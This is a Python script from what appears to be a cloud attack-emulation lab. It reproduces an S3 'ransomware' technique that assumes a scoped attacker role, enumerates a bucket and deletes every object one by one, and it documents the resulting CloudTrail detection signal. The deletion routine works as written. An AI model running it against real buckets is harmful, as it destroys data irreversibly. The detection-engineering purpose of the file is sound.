"""
Technique : aws.impact.s3-ransomware-individual-deletion
Tactic    : Impact (T1485 - Data Destruction)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.impact.s3-ransomware-individual-deletion/

How the attack works:
  ListObjectsV2 enumerates the bucket and DeleteObject removes each key. One
  CloudTrail data event per object makes the burst obvious when data events
  are on, and invisible when they are not.

Detection signal:
  - A burst of s3:DeleteObject data events from one principal on one bucket.

Revert:
  - Not reversible from the attack. The lab objects are synthetic; destroy and
    redeploy the stack to recreate them.

Credential model:
  Option B. The attack assumes the scoped attacker role created by infra/
  instead of acting as the tenant's cross-account role, so IAM bounds what
  it can reach.

Backend contract:
  run(outputs: dict, region: str = "us-east-1") -> None
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import time

import boto3
from botocore.exceptions import ClientError


def _bootstrap_session(outputs: dict, region: str):
    """Session for the attack. In the MayaTrail backend the worker injects the
    tenant's short-lived assumed-role credentials as outputs['_aws_credentials'];
    use them so the attack runs in the tenant account. Falls back to the ambient
    default session for standalone runs."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _assume_role_with_retry(sts_client, role_arn, session_name, duration=3600, max_attempts=5):
    """
    AssumeRole with propagation retry.

    A freshly created IAM role and its inline policy take a few seconds to become
    consistent; sts:AssumeRole can return AccessDenied during that window.
    """
    retryable = {"AccessDenied", "InvalidClientTokenId", "AuthFailure"}
    last_exc = None
    for attempt in range(1, max_attempts + 1):
        try:
            return sts_client.assume_role(
                RoleArn=role_arn,
                RoleSessionName=session_name,
                DurationSeconds=duration,
            )
        except ClientError as exc:
            code = exc.response["Error"]["Code"]
            if code in retryable and attempt < max_attempts:
                print(f"  [~] AssumeRole attempt {attempt}/{max_attempts} got {code}, retrying in 5s")
                time.sleep(5)
                last_exc = exc
            else:
                raise
    raise RuntimeError(f"AssumeRole failed after {max_attempts} attempts: {last_exc}")


def _attacker_session(outputs: dict, region: str, session_name: str):
    """
    Build the session the technique runs as.

    The tenant credentials injected by the worker are used only to assume the
    scoped attacker role this emulation's infra creates. The technique's calls
    are then made by that role, so IAM bounds the blast radius rather than the
    correctness of this script.
    """
    role_arn = (outputs or {}).get("attacker_role_arn", "")
    if not role_arn:
        raise RuntimeError("Missing required Pulumi output: attacker_role_arn")

    sts = _bootstrap_session(outputs, region).client("sts")
    creds = _assume_role_with_retry(sts, role_arn, session_name)["Credentials"]
    print(f"  [+] Assumed scoped attacker role: {role_arn}")
    print("  [!] CloudTrail event: sts:AssumeRole")
    return boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
        region_name=region,
    )


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}\n  {msg}\n{'=' * 60}")


def _require(outputs: dict, *keys: str) -> list:
    values = [(outputs or {}).get(k, "") for k in keys]
    missing = [k for k, v in zip(keys, values) if not v]
    if missing:
        raise RuntimeError(f"Missing required Pulumi output(s): {', '.join(missing)}")
    return values


def run(outputs: dict, region: str = "us-east-1") -> None:
    (bucket_name,) = _require(outputs, "bucket_name")

    banner("Step 0 - Assume the scoped attacker role (AssumeRole)")
    session = _attacker_session(outputs, region, "atomic-t1485-s3-individual")
    s3 = session.client("s3", region_name=region)

    banner("Step 1 - Enumerate objects (ListObjectsV2)")
    keys = []
    for page in s3.get_paginator("list_objects_v2").paginate(Bucket=bucket_name):
        keys += [obj["Key"] for obj in page.get("Contents", [])]
    print(f"  [+] Found {len(keys)} object(s) in {bucket_name}")
    if not keys:
        raise RuntimeError("Bucket is empty - nothing to delete (was the stack deployed?)")

    banner(f"Step 2 - Delete {len(keys)} objects one by one (DeleteObject)")
    deleted = 0
    for key in keys:
        s3.delete_object(Bucket=bucket_name, Key=key)
        deleted += 1
        if deleted % 25 == 0:
            print(f"  [+] Deleted {deleted}/{len(keys)}")
    print("  [!] CloudTrail data events: s3:DeleteObject x" + str(deleted))

    banner("Complete")
    print(f"  Objects deleted: {deleted}")
    print("CloudTrail events generated: sts:AssumeRole, s3:ListObjects (data), s3:DeleteObject (data) per object")
